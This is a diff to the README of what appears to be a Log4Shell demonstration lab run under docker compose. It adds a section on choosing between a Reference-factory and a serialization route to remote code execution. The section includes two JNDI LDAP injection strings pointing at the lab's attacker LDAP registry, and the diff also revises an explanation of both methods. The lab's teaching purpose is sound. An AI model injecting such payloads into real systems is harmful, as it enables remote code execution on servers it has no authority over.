@@ -35,6 +35,22 @@ log4shell-test-victim-1                        | Function rceMain called!
 log4shell-test-victim-1                        | 16:41:22.343 TRACE MainKt - Attempted injection: MadeClass
 ```
 
+### Options
+
+As detailed at the end of the "Exploit Resources" section, there are two methods
+of triggering remote code execution on the victim. One involves a `Reference`
+and a factory, while the other involves serialization.
+
+The factory method is the default, but the which method to use can be chosen by
+modifying the payload given to the victim. Change the `JAVA_OPTS` environment
+variable in the `docker compose` file to define the `victim-payload` system
+property to read either the first or second line depending on whether the former
+or latter method is desired.
+```
+$${jndi:ldap://attacker_ldap_registry:1389/cn=made-class,dc=ldap-registry,dc=attacker}
+$${jndi:ldap://attacker_ldap_registry:1389/cn=serialized-class,dc=ldap-registry,dc=attacker}
+```
+
 
 ## Exploit Resources
 
@@ -70,10 +86,11 @@ their own class into the application. Presumably, it would then have methods
 called on it, leading to Remote Code Execution (RCE).
 
 There are many ways to actually acheive RCE with this vector. One way is to
-store a serialized object in an LDAP server. Another way is to create a
-`Reference` to an object. `Reference` objects hold information about another
-object, including the factory class to use to create them. The factory class is
-where the RCE happens first. That's the method this code uses.
+create a `Reference` to an object. `Reference` objects hold information about
+another object, including the factory class to use to create them. The factory
+class is where the RCE happens first. Another way is to store a serialized
+object in an LDAP server. This object is deserialized on the victim, then a
+method is called on it to trigger RCE.
 
 ### Overview Resources
 * [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w):
